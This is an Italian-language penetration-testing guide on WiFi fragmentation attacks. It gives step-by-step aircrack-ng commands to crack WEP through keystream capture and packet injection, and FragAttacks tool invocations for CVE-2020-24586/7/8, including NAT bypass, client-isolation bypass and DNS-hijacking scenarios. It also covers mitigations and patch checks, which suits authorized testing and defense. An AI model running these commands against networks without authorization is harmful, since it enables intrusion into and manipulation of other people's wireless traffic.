# Fragmentation Attack

## Scopo

Questa guida copre i fragmentation attack contro reti WiFi, utilizzati per ottenere keystream da reti WEP e le recenti vulnerabilità FragAttacks (2021) che affliggono WPA2/WPA3.

## Prerequisiti

- Scheda WiFi con monitor mode e packet injection
- Kali Linux
- aircrack-ng suite
- **Autorizzazione per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install aircrack-ng
```

---

## WEP Fragmentation Attack

### Concetto

```
1. Cattura pacchetto criptato
2. Frammenta e ottiene keystream (PRGA)
3. Usa keystream per forgiare pacchetti
4. Inietta pacchetti per generare IVs
5. Cracka chiave WEP
```

### Workflow

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Scan
sudo airodump-ng wlan0mon

# Cattura target
sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon
```

### Fake Authentication

```bash
sudo aireplay-ng -1 0 -e ESSID -a AP_BSSID -h YOUR_MAC wlan0mon
```

### Fragmentation Attack

```bash
# Ottieni PRGA (keystream)
sudo aireplay-ng -5 -b AP_BSSID -h YOUR_MAC wlan0mon

# Output: fragment-XXXX.xor (PRGA file)
```

### Forgia Pacchetto ARP

```bash
packetforge-ng -0 -a AP_BSSID -h YOUR_MAC \
    -k 255.255.255.255 -l 255.255.255.255 \
    -y fragment-XXXX.xor \
    -w arp-request
```

### Injection

```bash
# Inietta ARP forgiato
sudo aireplay-ng -2 -r arp-request wlan0mon

# IVs aumentano in airodump
```

### Crack

```bash
aircrack-ng -z capture-01.cap
```

---

## FragAttacks (CVE-2020-24586, 24587, 24588)

### Vulnerabilità Scoperte (2021)

```
Affliggono TUTTI i protocolli: WEP, WPA, WPA2, WPA3

1. Aggregation Attack (CVE-2020-24588)
2. Mixed Key Attack (CVE-2020-24587)
3. Fragment Cache Attack (CVE-2020-24586)
```

### Impatto

- Injection di frame arbitrari
- Esfiltrazione dati
- Bypass NAT/Firewall
- Client-to-client attack

---

## Testing FragAttacks

### Tool Ufficiale

```bash
# Clone
git clone https://github.com/vanhoefm/fragattacks.git
cd fragattacks

# Installazione
./build.sh

# Python dependencies
pip3 install pycryptodome scapy
```

### Test Client

```bash
# Crea AP di test
# Connetti dispositivo target

# Run tests
cd fragattacks
./fragattack.py wlan0 --ap --inject-test
```

### Test Specifici

```bash
# Aggregation attack
./fragattack.py wlan0 --ap ping I,E,E

# Mixed key attack  
./fragattack.py wlan0 --ap ping I,E,P,E

# Cache attack
./fragattack.py wlan0 --ap cache
```

---

## Vulnerabilità Specifiche

### CVE-2020-24588 - Aggregation

```
- Frame aggregati (A-MSDU) accettati impropriamente
- Flag SPP non verificato
- Permette injection di frame

Test:
./fragattack.py wlan0 --ap amsdu-inject
```

### CVE-2020-24587 - Mixed Key

```
- Frammenti riassemblati con chiavi diverse
- Dopo PTK rekey
- Injection post-handshake

Test:
./fragattack.py wlan0 --ap ping I,E,R,E
```

### CVE-2020-24586 - Cache Poisoning

```
- Frammenti cached non rimossi
- Injection in sessioni successive
- Pre-connection attack

Test:
./fragattack.py wlan0 --ap cache-poison
```

---

## Exploitation Scenarios

### NAT/Firewall Bypass

```bash
# Inietta pacchetto che bypassa NAT
./fragattack.py wlan0 --ap inject-eth 192.168.1.100:80
```

### Client Isolation Bypass

```bash
# Comunicazione client-to-client
./fragattack.py wlan0 --ap forward
```

### DNS Hijacking

```bash
# Inietta risposta DNS malevola
./fragattack.py wlan0 --ap ping I,E --ptype dns
```

---

## Mitigazioni

### Vendor Patches

```
- Verifica aggiornamenti firmware AP
- Aggiorna driver client
- La maggior parte vendor ha patchato (2021+)
```

### Workarounds

```bash
# Disabilita A-MSDU (se possibile)
# Usa HTTPS sempre
# VPN per protezione layer 3
# Segmentazione rete
```

### Configurazione AP

```
# Cisco/Aruba/etc - Verifica patch status
# Disabilita mixed mode se possibile
# Abilita WIDS/WIPS
```

---

## Verifica Vulnerabilità

### Check Firmware

```bash
# Linux - verifica driver
modinfo ath9k | grep version

# Check patches
dmesg | grep -i wifi
```

### Scan con Tool

```bash
# Test specifico dispositivo
./fragattack.py wlan0 --client test-all

# Report
./fragattack.py wlan0 --client test-all > report.txt
```

---

## Best Practices

- **Aggiorna firmware**: AP e client
- **Patching**: Applica security update
- **HTTPS**: Sempre per dati sensibili
- **VPN**: Protezione aggiuntiva
- **Test regolari**: Verifica nuove vulnerabilità
- **Monitoring**: WIDS per anomalie

## Riferimenti

- [FragAttacks Official Site](https://www.fragattacks.com/)
- [FragAttacks GitHub](https://github.com/vanhoefm/fragattacks)
- [Paper Originale](https://papers.mathyvanhoef.com/usenix2021.pdf)
- [Aircrack-ng Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation)
